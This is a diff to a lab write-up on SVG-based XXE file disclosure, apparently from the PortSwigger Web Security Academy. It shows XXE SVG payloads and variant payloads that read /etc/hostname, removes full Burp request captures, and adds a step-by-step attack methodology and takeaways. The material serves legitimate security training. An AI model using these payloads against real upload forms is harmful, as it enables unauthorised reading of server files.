@@ -39,6 +39,7 @@ The payload used:
 <svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg">
 <text font-size="16" x="0" y="16">&xxe;</text>
 </svg>
+```
 ## Uploading the Avatar
 ![Selecting avatar.svg](https://images/02-uploading-avatar.png)
 *Figure 2: Selecting avatar.svg file for upload in the comment form*
@@ -153,85 +154,6 @@ testing my payloads
 | **Using xlink:href** | `<svg xmlns:xlink="http://www.w3.org/1999/xlink"><image xlink:href="file:///etc/hostname" width="200" height="200"/></svg>` |
 | **Using ForeignObject** | `<svg><foreignObject><div xmlns="http://www.w3.org/1999/xhtml"><p>file:///etc/hostname</p></div></foreignObject></svg>` |
 
-## Burp Suite Request Analysis
-
-### Original Request (PNG Upload)
-
-```http
-POST /post/comment HTTP/2
-Host: 0a08004d033fd943815d2a9900220012.web-security-academy.net
-Cookie: session=your-session
-Content-Type: multipart/form-data; boundary=----Boundary
-
-------Boundary
-Content-Disposition: form-data; name="csrf"
-
-csrf-token
-------Boundary
-Content-Disposition: form-data; name="postId"
-
-1
-------Boundary
-Content-Disposition: form-data; name="comment"
-
-test
-------Boundary
-Content-Disposition: form-data; name="name"
-
-Henry
-------Boundary
-Content-Disposition: form-data; name="avatar"; filename="avatar.png"
-Content-Type: image/png
-
-[PNG binary data]
-------Boundary--
-```
-
-### Modified Request (SVG XXE Payload)
-
-```http
-POST /post/comment HTTP/2
-Host: 0a08004d033fd943815d2a9900220012.web-security-academy.net
-Cookie: session=your-session
-Content-Type: multipart/form-data; boundary=----geckoforboundaryf09426d8873705cf592648ee28f2b0c6
-
-------geckoforboundaryf09426d8873705cf592648ee28f2b0c6
-Content-Disposition: form-data; name="csrf"
-
-csrf-token
-------geckoforboundaryf09426d8873705cf592648ee28f2b0c6
-Content-Disposition: form-data; name="postId"
-
-1
-------geckoforboundaryf09426d8873705cf592648ee28f2b0c6
-Content-Disposition: form-data; name="comment"
-
-testing my payloads
-------geckoforboundaryf09426d8873705cf592648ee28f2b0c6
-Content-Disposition: form-data; name="name"
-
-Henry
-------geckoforboundaryf09426d8873705cf592648ee28f2b0c6
-Content-Disposition: form-data; name="avatar"; filename="avatar.svg"
-Content-Type: image/svg+xml
-
-<?xml version="1.0" standalone="yes"?>
-<!DOCTYPE svg [
-<!ENTITY xxe SYSTEM "file:///etc/hostname">
-]>
-<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg">
-<text font-size="16" x="0" y="16">&xxe;</text>
-</svg>
-------geckoforboundaryf09426d8873705cf592648ee28f2b0c6--
-```
-
-## Key Modifications
-
-| Field | Original | Modified |
-| :--- | :--- | :--- |
-| **filename** | `avatar.png` | `avatar.svg` |
-| **Content-Type** | `image/png` | `image/svg+xml` |
-| **File Content** | PNG binary | SVG XML payload |
 
 ## File Disclosure Targets
 
@@ -335,3 +257,19 @@ Enclosed Exception: The processing instruction target matching "[xX][mM][lL]" is
 | :--- | :--- |
 | **1. Identify Entry Points** | Check file upload forms, comment sections, avatar uploads |
 | **2. Analyze File Processing** | Determine which libraries process uploaded files |
+| **3. Test SVG Upload** | Try uploading SVG files to see if accepted |
+| **4. Create Payload** | Craft XXE payload to read system files |
+| **5. Intercept Request** | Use Burp to modify filename and Content-Type |
+| **6. View Output** | Check rendered image for extracted data |
+| **7. Submit Solution** | Submit extracted data to complete lab |
+
+
+## Key Takeaways
+
+* **SVG = XML:** SVG files are processed as XML, making them vulnerable to XXE
+* **Apache Batik Vulnerability:** The library resolves external entities by default
+* **File Extension Matters:** Ensure `.svg` extension and proper `Content-Type`
+* **Check the Corners:** Extracted data may appear tiny - zoom in!
+* **Multiple Payloads:** Try different syntax if the first one fails
+* **Entity References:** Make sure `&xxe;` is properly spelled in the text element
+
